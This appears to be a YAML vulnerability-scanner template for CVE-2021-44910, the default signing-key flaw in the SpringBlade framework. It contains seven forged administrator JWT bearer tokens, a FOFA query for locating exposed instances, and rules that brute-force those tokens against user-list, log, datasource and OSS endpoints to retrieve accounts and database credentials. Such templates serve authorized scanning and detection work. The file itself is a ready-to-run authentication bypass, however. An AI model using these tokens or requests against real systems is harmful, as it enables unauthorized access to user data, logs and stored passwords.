id: CVE-2021-44910-2

info:
  name: SpringBlade 框架默认 SIGN_KRY 秘钥漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    SpringBlade 框架存在默认SIGN_KEY，攻击者可利用漏洞获取用户账号密码日志等敏感信息。
    fofa: body="saber/iconfont.css" || body="Saber 将不能正常工作"||title="Sword Admin"||body="We're sorry but avue-data doesn't work"
  reference:
    - https://forum.butian.net/share/973
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44910
  tags: cve,cve2021,bypass,springblade
  created: 2023/12/12

set:
  token_list:
    - "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSJ9.-XHkGTDfmGOdB8DNKwcCgWIfcR8Ln4hs09CVDslv1ATodR2Mjmjrq6KCysoK-sw3zf2EwATzdgxGXNGxfmj9wg"
    - "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ"
    - "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.5qFj53pqhIZVccg_h0WAvd-FAjG7sDwfVUe5gPBHa0g"
    - "bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk"
    - "bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.kol9scDVwLDE8U3mM_j8O4UYrpdUc9_Zw935g7Nb979DfRuanai1UeKsK2zCKuR77Otryi0sGzBfGANDbLseBg"
    - "bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMSIsIm5hbWUiOiJhZG1pbiIsInJvbGVfbmFtZSI6ImFkbWluaXN0cmF0b3IifQ.3KqH3YSCVDA2wpD1JB4p5iOqFK_qa3pjuwIQOpSYB1e_CEQL4g-Ulkn_oJyOGBtBvJQn_qiMn59jFbMGnNHUwA"
    - "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ"
rules:
  r0:
    brute:
      mode: sniper
      token: "{{token_list}}"
    request:
      method: GET
      path: /api/blade-user/user-list
      headers:
        Blade-Auth: "{{token}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":') && response.body.bcontains(b'"createUser":')
    stop_if_match: true
  r1:
    brute:
      mode: sniper
      token: "{{token_list}}"
    request:
      method: GET
      path: /api/blade-log/api/list
      headers:
        Blade-Auth: "{{token}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
    stop_if_match: true
  r2:
    brute:
      mode: sniper
      token: "{{token_list}}"
    request:
      method: GET
      path: /api/blade-system/user/user-list
      headers:
        Blade-Auth: "{{token}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"success":') && response.body.bcontains(b'"data":') && response.body.bcontains(b'"createUser":')
    stop_if_match: true
  r3:
    brute:
      mode: sniper
      token: "{{token_list}}"
    request:
      method: GET
      path: /api/blade-system/user/api/list
      headers:
        Blade-Auth: "{{token}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"params":') && response.body.bcontains(b'"msg":')
    stop_if_match: true
  r4:
    brute:
      mode: sniper
      token: "{{token_list}}"
    request:
      method: GET
      path: /api/blade-develop/datasource/list
      headers:
        Blade-Auth: "{{token}}"
    expression: response.status == 200 && response.body.bcontains(b"\"code\":200") && response.body.bcontains(b'"driverClass":') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
    stop_if_match: true
  r5:
    brute:
      mode: sniper
      token: "{{token_list}}"
    request:
      method: GET
      path: /api/blade-resource/oss/list
      headers:
        Blade-Auth: "{{token}}"
    expression: response.status == 500 && response.body.bcontains(b'"code":500') && response.body.bcontains(b'"success":false') && response.body.bcontains(b"java.sql.SQLSyntaxErrorException:") && response.body.bcontains(b"Table 'm_exchanges_international.blade_oss' doesn't exist")
    stop_if_match: true

expression: r0() || r1() || r2() || r3() || r4() || r5()
